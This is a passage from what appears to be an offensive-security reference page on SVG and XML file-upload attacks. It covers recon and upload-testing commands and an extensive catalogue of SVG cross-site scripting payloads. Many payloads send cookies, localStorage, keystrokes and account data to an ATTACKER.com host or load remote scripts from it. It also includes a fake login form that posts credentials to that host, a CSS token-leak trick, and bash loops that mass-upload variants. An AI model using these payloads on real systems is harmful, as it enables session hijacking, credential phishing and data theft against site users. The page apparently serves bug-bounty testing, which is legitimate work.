---
title: SVG & XML Payloads — XSS & XXE
description: SVG and XML file upload vectors to achieve Cross-Site Scripting, XML External Entity injection, Server-Side Request Forgery, and data exfiltration through crafted SVG and XML-based file formats.
navigation:
  icon: i-lucide-file-code
  title: SVG & XML Payloads — XSS & XXE
---

## What Are SVG & XML Upload Attacks

::badge
**High to Critical Severity — CWE-79 / CWE-611 / CWE-918**
::

SVG (Scalable Vector Graphics) files are XML-based image formats that web applications commonly accept as valid image uploads. Unlike raster images (JPEG, PNG, GIF), SVG files contain **executable markup** — they can embed JavaScript, reference external entities, load remote resources, and interact with the DOM. When a web application accepts SVG uploads and serves them back to users with an XML or SVG content type, every feature of the SVG specification becomes an attack surface.

XML-based file formats extend far beyond SVG. Office documents (DOCX, XLSX, PPTX), configuration files, data interchange formats (RSS, Atom, SOAP, XLIFF), and dozens of other formats are XML internally. Any application that parses these files on the server side is potentially vulnerable to XXE injection.

::note
SVG upload attacks are among the most underestimated vulnerabilities in bug bounty. Many applications whitelist SVG as a "safe image format" without realizing it carries the same risk as uploading raw HTML with JavaScript.
::

The attack surface splits into two distinct categories based on where the payload executes.

::card-group
  :::card
  ---
  icon: i-lucide-monitor
  title: Client-Side Attacks (XSS)
  ---
  The SVG is served to a user's browser which parses and renders it. Embedded JavaScript executes in the context of the application's origin, enabling cookie theft, session hijacking, account takeover, keylogging, and phishing.
  
  **Requires:** SVG served with `Content-Type: image/svg+xml` or rendered inline in the DOM.
  :::

  :::card
  ---
  icon: i-lucide-server
  title: Server-Side Attacks (XXE / SSRF)
  ---
  The server parses the uploaded XML/SVG file using a vulnerable XML parser. External entity declarations cause the server to read local files, make HTTP requests to internal services, or exfiltrate data to attacker-controlled servers.
  
  **Requires:** Server-side XML parsing with external entities enabled (default in many parsers).
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Hybrid Attacks (SSRF via SVG Rendering)
  ---
  The server renders SVG to raster image (PNG/JPEG) for thumbnails or previews. During rendering, the SVG engine fetches external resources referenced in the SVG, enabling SSRF against internal infrastructure.
  
  **Requires:** Server-side SVG rendering (librsvg, Inkscape, ImageMagick, Chrome headless, wkhtmltoimage).
  :::

  :::card
  ---
  icon: i-lucide-layers
  title: XML-Based Format Attacks
  ---
  Office documents, RSS feeds, SOAP requests, and other XML formats are uploaded and parsed. XXE payloads injected into internal XML structures trigger file read, SSRF, or denial of service on the server.
  
  **Requires:** Server processes the uploaded file's XML content (document conversion, data import, feed parsing).
  :::
::

---

## Attack Flow Architecture

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---
```
┌─────────────────────────────────────────────────────────────────────┐
│                SVG & XML UPLOAD ATTACK FLOW                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────┐     ┌───────────────┐     ┌──────────────────┐   │
│  │ Find Upload  │────▶│ Check If SVG/ │────▶│ Determine How    │   │
│  │ Endpoint     │     │ XML Accepted  │     │ File Is Processed│   │
│  └──────────────┘     └───────────────┘     └────────┬─────────┘   │
│                                                      │             │
│                    ┌─────────────────────────────────┐│             │
│                    ▼                  ▼              ▼│             │
│  ┌────────────────────┐ ┌──────────────────┐ ┌──────────────────┐  │
│  │ Served Directly    │ │ Parsed Server-   │ │ Rendered to      │  │
│  │ to Browser         │ │ Side (XML Parser)│ │ Raster Image     │  │
│  │                    │ │                  │ │ (Thumbnail/      │  │
│  │ Attack: XSS        │ │ Attack: XXE      │ │  Preview)        │  │
│  │ ─ Stored XSS       │ │ ─ File Read      │ │                  │  │
│  │ ─ Cookie Theft      │ │ ─ SSRF           │ │ Attack: SSRF     │  │
│  │ ─ Session Hijack   │ │ ─ Data Exfil     │ │ ─ Cloud Metadata │  │
│  │ ─ Keylogging       │ │ ─ DoS            │ │ ─ Internal Scan  │  │
│  │ ─ Phishing         │ │ ─ RCE (rare)     │ │ ─ Port Scan      │  │
│  └────────────────────┘ └──────────────────┘ └──────────────────┘  │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │              XML-BASED FILE FORMATS                         │    │
│  │  SVG ─ DOCX ─ XLSX ─ PPTX ─ ODT ─ ODS ─ ODP              │    │
│  │  RSS ─ Atom ─ SOAP ─ XLIFF ─ GPX ─ KML ─ MathML           │    │
│  │  XHTML ─ XSL/XSLT ─ WSDL ─ XML Config ─ Sitemap          │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#code
```
Flow: Upload → Determine Processing Method → Select Attack Vector → Exploit
```
::

---

## Reconnaissance & Discovery

### Finding SVG/XML Upload Surfaces

::tabs
  :::tabs-item{icon="i-lucide-search" label="Endpoint Discovery"}
  ```bash
  # === Crawl for upload forms that accept SVG ===
  katana -u https://target.com -d 5 -jc | grep -iE "upload|file|attach|import|avatar|photo|image|media|icon|logo|banner"

  # === Check accept attributes for SVG ===
  curl -s https://target.com/upload | grep -oP 'accept="[^"]*"'
  # Look for: accept="image/*" or accept=".svg" or accept="image/svg+xml"

  # === Brute force upload endpoints ===
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
    -mc 200,301,302 -t 50 | grep -iE "upload|file|import|media"

  feroxbuster -u https://target.com \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,asp,aspx,jsp -t 100 --filter-status 404 | grep -iE "upload|file|media|image"

  # === Historical endpoints via Wayback ===
  waybackurls target.com | grep -iE "upload|file|attach|import|image|avatar|svg|xml" | sort -u
  gau target.com --threads 5 | grep -iE "upload|attach|file|import|svg|xml" | sort -u

  # === API endpoint discovery ===
  ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,405
  ffuf -u https://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,405

  # === JavaScript analysis for upload handlers ===
  katana -u https://target.com -jc -d 3 -ef css,png,jpg | httpx -mc 200 | while read url; do
    curl -s "$url" | grep -oP '(upload|formData|multipart|file-input|dropzone|svg|xml|image)[^"'\'']*'
  done | sort -u

  # === Find SVG rendering / processing indicators ===
  curl -s https://target.com | grep -iE "svg|inkscape|librsvg|imagemagick|rsvg|cairosvg|sharp|canvas|thumbnail"
  ```
  :::

  :::tabs-item{icon="i-lucide-list" label="Common SVG Upload Surfaces"}
  ```
  # === Profile & Account ===
  /api/user/avatar
  /api/profile/photo
  /api/profile/picture
  /settings/avatar
  /account/image
  /user/logo
  /team/logo
  /organization/icon

  # === Content Management ===
  /admin/media/upload
  /wp-admin/upload.php
  /ckeditor/upload
  /tinymce/upload
  /elfinder/connector
  /filemanager/upload
  /editor/upload-image
  /api/media
  /api/assets

  # === Documents & Files ===
  /upload
  /api/upload
  /api/v1/files
  /api/v1/upload
  /api/attachments
  /documents/upload
  /import
  /bulk-import

  # === Design & Branding ===
  /api/brand/logo
  /settings/favicon
  /customize/logo
  /theme/upload
  /template/import
  /design/upload

  # === Communication ===
  /chat/upload
  /message/attachment
  /support/ticket/attachment
  /comment/attachment
  /forum/attachment

  # === Data Import (XML vectors) ===
  /api/import/xml
  /api/import/data
  /feed/import
  /rss/add
  /sitemap/upload
  /config/import
  /settings/import
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SVG Acceptance Testing"}
  ```bash
  # === Test if SVG is accepted ===
  # Create minimal valid SVG
  cat > test.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <rect width="100" height="100" fill="blue"/>
  </svg>
  EOF

  # Upload as image/svg+xml
  curl -X POST https://target.com/upload \
    -F "file=@test.svg;type=image/svg+xml" \
    -b "session=COOKIE" -v 2>&1 | tail -30

  # Try alternative MIME types if svg+xml is blocked
  for mime in "image/svg+xml" "image/svg" "text/xml" "application/xml" "text/plain" "application/octet-stream" "image/png"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@test.svg;type=$mime" -b "session=COOKIE" 2>/dev/null)
    echo "MIME: $mime → HTTP $STATUS"
  done

  # Try SVG with image extension
  cp test.svg test.svg.png
  cp test.svg test.svg.jpg
  cp test.svg test_image.png  # SVG content, .png extension

  for f in test.svg test.svg.png test.svg.jpg test_image.png; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$f;type=image/png" -b "session=COOKIE" 2>/dev/null)
    echo "$f → HTTP $STATUS"
  done

  # Test XML file upload
  cat > test.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <root><data>test</data></root>
  EOF

  for mime in "text/xml" "application/xml" "text/plain" "application/octet-stream"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@test.xml;type=$mime" -b "session=COOKIE" 2>/dev/null)
    echo "XML with MIME $mime → HTTP $STATUS"
  done
  ```
  :::
::

### Determining How SVG/XML Is Processed

::warning
The type of attack depends entirely on how the server handles the uploaded file. A file served directly enables XSS; a file parsed server-side enables XXE; a file rendered to image enables SSRF.
::

::code-group
```bash [Check Serving Behavior]
# === After successful upload, check how the file is served ===

# Check Content-Type header of uploaded SVG
curl -sI "https://target.com/uploads/test.svg"
# image/svg+xml      → Browser renders SVG → XSS possible!
# application/xml    → Browser may render → XSS possible!
# text/xml           → Browser may render → XSS possible!
# text/html          → Browser renders as HTML → XSS possible!
# text/plain         → Browser shows raw text → XSS NOT possible
# application/octet-stream → Downloads file → XSS NOT possible
# image/png          → Converted to raster → Check for SSRF

# Check Content-Disposition header
curl -sI "https://target.com/uploads/test.svg" | grep -i "content-disposition"
# attachment → Forces download → XSS NOT possible via direct access
# inline    → Renders in browser → XSS possible!
# (missing) → Browser decides based on Content-Type

# Check Content-Security-Policy
curl -sI "https://target.com/uploads/test.svg" | grep -i "content-security-policy"
# script-src 'none' → Blocks inline JS in SVG
# sandbox           → Restricts SVG execution context

# Check X-Content-Type-Options
curl -sI "https://target.com/uploads/test.svg" | grep -i "x-content-type-options"
# nosniff → Browser strictly follows Content-Type
# (missing) → Browser may MIME-sniff and render SVG

# === Full header analysis ===
curl -sI "https://target.com/uploads/test.svg" | head -20
```

```bash [Check Processing Behavior]
# === Determine if server processes SVG content ===

# Test 1: Does the server convert SVG to PNG/JPEG?
# Upload SVG, check if returned URL points to .png or .jpg
curl -s -X POST https://target.com/upload \
  -F "file=@test.svg;type=image/svg+xml" -b "session=COOKIE" | \
  python3 -m json.tool 2>/dev/null | grep -iE "url|path|src"
# If URL ends in .png/.jpg → Server renders SVG to raster

# Test 2: Does the server extract SVG metadata?
# Upload SVG with unique title/description
cat > meta_test.svg << 'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <title>UNIQUE_SVG_TITLE_12345</title>
  <desc>UNIQUE_SVG_DESC_67890</desc>
  <rect width="100" height="100" fill="red"/>
</svg>
EOF
# Upload and search response for extracted text
RESPONSE=$(curl -s -X POST https://target.com/upload \
  -F "file=@meta_test.svg;type=image/svg+xml" -b "session=COOKIE")
echo "$RESPONSE" | grep -c "UNIQUE_SVG_TITLE_12345"
# If found → Server parses SVG XML → XXE possible

# Test 3: Does the server resize/modify SVG?
# Compare uploaded SVG with served SVG
curl -s "https://target.com/uploads/test.svg" > served.svg
diff test.svg served.svg
# If different → Server modifies SVG (may strip dangerous elements)
# If identical → Server stores and serves as-is

# Test 4: Does the server make external requests?
# Start listener and upload SVG with external reference
cat > ssrf_test.svg << 'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://YOUR_COLLABORATOR_URL/ssrf_test" width="100" height="100"/>
</svg>
EOF
# Upload and check collaborator/listener for incoming request
# If request received → Server fetches external resources → SSRF possible
```

```bash [Collaborator/Listener Setup]
# === Set up listener to detect server-side processing ===

# Option 1: Python HTTP server
python3 -m http.server 8888
# Then use http://YOUR_IP:8888/test in SVG payloads

# Option 2: Netcat listener
nc -lvnp 8888

# Option 3: Burp Collaborator
# Use Burp Collaborator URL in payloads
# Check Collaborator tab for incoming connections

# Option 4: Interactsh (open-source Collaborator alternative)
interactsh-client -v
# Returns a unique URL like: abc123.interact.sh
# Use this URL in SVG/XML payloads

# Option 5: Webhook.site
# Use https://webhook.site for free external listener

# Option 6: RequestBin
# Use https://requestbin.com for HTTP request capture

# DNS-only detection
# Use Burp Collaborator or interactsh for DNS callbacks
# Useful when HTTP is blocked but DNS resolves
```
::

---

## SVG XSS Payloads

### Core XSS Vectors

::tip
SVG supports multiple JavaScript execution contexts: `onload` events, `<script>` elements, event handlers on shapes, `<animate>` triggers, `<foreignObject>` HTML embedding, and `<use>` element references. Test all of them because sanitizers often miss some.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="onload Event XSS"}
  ```xml
  <!-- === Most Basic SVG XSS === -->
  <!-- onload fires when SVG is rendered in browser -->

  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  </svg>

  <!-- With XML declaration (more standards-compliant) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  </svg>

  <!-- With dimensions (may bypass size-based filters) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500" onload="alert(document.domain)">
    <rect width="500" height="500" fill="white"/>
  </svg>

  <!-- Cookie stealing -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://ATTACKER.com/steal?c='+document.cookie)">
  </svg>

  <!-- Session token exfiltration -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='https://ATTACKER.com/x?d='+document.cookie">
  </svg>

  <!-- localStorage/sessionStorage theft -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://ATTACKER.com/x?ls='+JSON.stringify(localStorage))">
  </svg>

  <!-- Redirect to phishing page -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="window.location='https://ATTACKER.com/phish'">
  </svg>

  <!-- Keylogger injection -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="document.onkeypress=function(e){fetch('https://ATTACKER.com/k?k='+e.key)}">
  </svg>
  ```

  ```bash
  # Upload onload XSS SVG
  cat > xss_onload.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <rect width="100" height="100" fill="green"/>
  </svg>
  SVGEOF

  curl -X POST https://target.com/upload \
    -F "file=@xss_onload.svg;type=image/svg+xml" \
    -b "session=COOKIE" -v

  # Check if served with exploitable Content-Type
  curl -sI "https://target.com/uploads/xss_onload.svg" | grep -i content-type
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Script Element XSS"}
  ```xml
  <!-- === <script> Tag Inside SVG === -->

  <!-- Basic script tag -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.domain)</script>
  </svg>

  <!-- With type attribute -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">alert(document.domain)</script>
  </svg>

  <!-- With CDATA section (proper XML escaping) -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
    <![CDATA[
      alert(document.domain);
    ]]>
    </script>
  </svg>

  <!-- External script loading -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script xlink:href="https://ATTACKER.com/evil.js"/>
  </svg>

  <!-- External script with xmlns:xlink -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <script xlink:href="https://ATTACKER.com/evil.js"/>
  </svg>

  <!-- Script with href (SVG 2.0) -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script href="https://ATTACKER.com/evil.js"/>
  </svg>

  <!-- Multiple script blocks -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>var a=document.cookie;</script>
    <script>fetch('https://ATTACKER.com/?c='+a);</script>
  </svg>

  <!-- Advanced cookie stealer with full context -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
    <![CDATA[
      var data = {
        cookie: document.cookie,
        url: window.location.href,
        origin: window.location.origin,
        localStorage: JSON.stringify(localStorage),
        referrer: document.referrer
      };
      fetch('https://ATTACKER.com/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      });
    ]]>
    </script>
  </svg>
  ```

  ```bash
  # Upload script-based XSS SVG
  cat > xss_script.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
    <![CDATA[
      alert('XSS on ' + document.domain);
    ]]>
    </script>
    <rect width="200" height="200" fill="blue"/>
  </svg>
  SVGEOF

  curl -X POST https://target.com/upload \
    -F "file=@xss_script.svg;type=image/svg+xml" \
    -b "session=COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Event Handler XSS"}
  ```xml
  <!-- === Event Handlers on SVG Elements === -->

  <!-- onmouseover on rect -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="500" height="500" fill="white" onmouseover="alert(document.domain)"/>
  </svg>

  <!-- onclick on circle -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <circle cx="50" cy="50" r="50" fill="red" onclick="alert(document.domain)"/>
  </svg>

  <!-- onfocus on SVG root with autofocus trick -->
  <svg xmlns="http://www.w3.org/2000/svg" onfocus="alert(document.domain)" autofocus>
    <rect width="100" height="100"/>
  </svg>

  <!-- onmouseenter (triggers without clicking) -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="1000" height="1000" fill="transparent" onmouseenter="alert(document.domain)"/>
  </svg>

  <!-- onmousemove (triggers on any mouse movement) -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="1000" height="1000" fill="transparent" onmousemove="alert(document.domain)"/>
  </svg>

  <!-- onerror via broken image -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="x" onerror="alert(document.domain)" width="100" height="100"/>
  </svg>

  <!-- Multiple event handlers for reliability -->
  <svg xmlns="http://www.w3.org/2000/svg"
       onload="alert('onload')"
       onfocus="alert('onfocus')"
       onmouseover="alert('onmouseover')">
    <rect width="500" height="500" fill="white"
          onclick="alert('onclick')"
          onmouseenter="alert('onmouseenter')"
          onmousemove="alert('onmousemove')"/>
  </svg>

  <!-- Less common event handlers -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" onmouseout="alert(1)"/>
    <rect width="100" height="100" onmouseup="alert(1)"/>
    <rect width="100" height="100" onmousedown="alert(1)"/>
    <rect width="100" height="100" ontouchstart="alert(1)"/>
    <rect width="100" height="100" ontouchend="alert(1)"/>
    <rect width="100" height="100" ontouchmove="alert(1)"/>
  </svg>
  ```

  ```bash
  # Upload all event handler variants
  EVENTS="onload onfocus onmouseover onmouseenter onmousemove onclick onmouseout onmousedown onmouseup ontouchstart"

  for event in $EVENTS; do
    cat > "xss_${event}.svg" << SVGEOF
  <?xml version="1.0"?>
  <svg xmlns="http://www.w3.org/2000/svg" ${event}="alert('${event}')">
    <rect width="500" height="500" fill="white"/>
  </svg>
  SVGEOF
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@xss_${event}.svg;type=image/svg+xml" -b "session=COOKIE" 2>/dev/null)
    echo "$event → HTTP $STATUS"
    rm -f "xss_${event}.svg"
  done
  ```
  :::
::

### Advanced XSS Vectors

::accordion
  :::accordion-item{icon="i-lucide-code" label="foreignObject XSS (HTML Injection Inside SVG)"}
  `<foreignObject>` allows embedding arbitrary HTML and XHTML content inside an SVG document. This is extremely powerful because it gives full access to HTML elements, forms, iframes, and JavaScript — all rendered within the SVG context on the application's origin.

  ```xml
  <!-- === Basic foreignObject with script === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>alert(document.domain)</script>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with iframe === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="javascript:alert(document.domain)"></iframe>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with img onerror === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <img src="x" onerror="alert(document.domain)"/>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with form (credential phishing) === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">
    <foreignObject width="400" height="300">
      <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0">
        <div style="font-family:Arial;padding:20px;background:#f5f5f5">
          <h2 style="color:#333">Session Expired</h2>
          <p>Please re-enter your credentials:</p>
          <form action="https://ATTACKER.com/steal" method="POST">
            <input name="username" placeholder="Username" style="width:100%;padding:8px;margin:5px 0"/><br/>
            <input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:5px 0"/><br/>
            <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;cursor:pointer">Login</button>
          </form>
        </div>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with full page takeover === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
    <foreignObject width="100%" height="100%">
      <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0">
        <div id="overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
          <script>
            // Replace entire page content with phishing form
            document.getElementById('overlay').innerHTML = '<h1>Loading...</h1>';
            fetch(window.location.origin + '/api/user/profile', {credentials:'include'})
              .then(r => r.json())
              .then(d => fetch('https://ATTACKER.com/exfil', {
                method: 'POST',
                body: JSON.stringify(d)
              }));
          </script>
        </div>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with input auto-exfil (keylogger) === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>
          document.addEventListener('keypress', function(e) {
            new Image().src = 'https://ATTACKER.com/keys?k=' + e.key + '&u=' + encodeURIComponent(window.location.href);
          });
        </script>
      </body>
    </foreignObject>
  </svg>
  ```

  ```bash
  # Upload foreignObject XSS
  cat > xss_foreign.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>alert('foreignObject XSS on ' + document.domain)</script>
      </body>
    </foreignObject>
  </svg>
  SVGEOF

  curl -X POST https://target.com/upload \
    -F "file=@xss_foreign.svg;type=image/svg+xml" \
    -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="animate / set / animateTransform XSS"}
  SVG animation elements can trigger JavaScript execution through event handlers. These are often missed by sanitizers that only strip `<script>` tags and common event handlers.

  ```xml
  <!-- === animate with onbegin === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/>
  </svg>

  <!-- === animate with onend === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onend="alert(document.domain)" attributeName="x" dur="1s" fill="freeze"/>
  </svg>

  <!-- === animate with onrepeat === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onrepeat="alert(document.domain)" attributeName="x" dur="1s" repeatCount="1"/>
  </svg>

  <!-- === set element (simpler animation) === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <set onbegin="alert(document.domain)" attributeName="x" to="1" dur="1s"/>
  </svg>

  <!-- === animateTransform === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animateTransform onbegin="alert(document.domain)" attributeName="transform" type="rotate" dur="1s"/>
  </svg>

  <!-- === animateMotion === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animateMotion onbegin="alert(document.domain)" dur="1s" path="M0,0 L100,100"/>
  </svg>

  <!-- === animate on specific element === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" fill="red">
      <animate attributeName="fill" values="red;blue" dur="1s"
               onbegin="alert(document.domain)"/>
    </rect>
  </svg>

  <!-- === Chained animations === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate id="a1" attributeName="x" dur="0.1s" onend="alert(document.domain)"/>
  </svg>

  <!-- === animate with begin="0s" (immediate) === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate attributeName="x" begin="0s" dur="0.001s"
             onbegin="alert(document.domain)"/>
  </svg>
  ```

  ```bash
  # Test all animation-based XSS vectors
  ANIM_ELEMENTS=("animate" "set" "animateTransform" "animateMotion")
  ANIM_EVENTS=("onbegin" "onend" "onrepeat")

  for elem in "${ANIM_ELEMENTS[@]}"; do
    for event in "${ANIM_EVENTS[@]}"; do
      cat > "xss_${elem}_${event}.svg" << SVGEOF
  <?xml version="1.0"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <${elem} ${event}="alert('${elem}_${event}')" attributeName="x" dur="1s"/>
  </svg>
  SVGEOF
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
        -F "file=@xss_${elem}_${event}.svg;type=image/svg+xml" -b "session=COOKIE" 2>/dev/null)
      echo "$elem + $event → HTTP $STATUS"
      rm -f "xss_${elem}_${event}.svg"
    done
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="use / image / a Element XSS"}
  ```xml
  <!-- === <use> element with data: URI === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.domain)</script></svg>#x"/>
  </svg>

  <!-- === <use> with external SVG reference === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="https://ATTACKER.com/evil.svg#payload"/>
  </svg>

  <!-- === <a> element with javascript: URI === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="javascript:alert(document.domain)">
      <rect width="500" height="500" fill="white"/>
      <text x="20" y="30" fill="black" font-size="20">Click anywhere</text>
    </a>
  </svg>

  <!-- === <a> with href (SVG 2.0) === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <a href="javascript:alert(document.domain)">
      <circle cx="50" cy="50" r="50" fill="red"/>
    </a>
  </svg>

  <!-- === <image> with SVG source (recursive) === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+PC9zdmc+" width="100" height="100"/>
  </svg>

  <!-- === Embedded data URI SVG === -->
  <!-- Base64 of: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg> -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+PC9zdmc+" width="200" height="200"/>
  </svg>

  <!-- === <image> with onerror === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="x" onerror="alert(document.domain)" width="100" height="100"/>
  </svg>
  ```

  ```bash
  # Generate base64 SVG payload for <image> tag injection
  INNER_SVG='<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>'
  B64=$(echo -n "$INNER_SVG" | base64 | tr -d '\n')
  
  cat > xss_use.svg << SVGEOF
  <?xml version="1.0"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="data:image/svg+xml;base64,${B64}" width="200" height="200"/>
  </svg>
  SVGEOF

  curl -X POST https://target.com/upload \
    -F "file=@xss_use.svg;type=image/svg+xml" -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="CSS-Based XSS Inside SVG"}
  ```xml
  <!-- === SVG with embedded CSS (older browser attacks) === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <style>
      @import url("https://ATTACKER.com/track.css");
    </style>
    <rect width="100" height="100" fill="red"/>
  </svg>

  <!-- === CSS-based data exfiltration (attribute value leak) === -->
  <!-- Steal CSRF tokens or form values character-by-character -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <style>
          input[name="csrf"][value^="a"] { background: url(https://ATTACKER.com/leak?char=a); }
          input[name="csrf"][value^="b"] { background: url(https://ATTACKER.com/leak?char=b); }
          input[name="csrf"][value^="c"] { background: url(https://ATTACKER.com/leak?char=c); }
          /* ... continue for all characters ... */
        </style>
      </body>
    </foreignObject>
  </svg>

  <!-- === SVG with external stylesheet === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <?xml-stylesheet type="text/css" href="https://ATTACKER.com/evil.css"?>
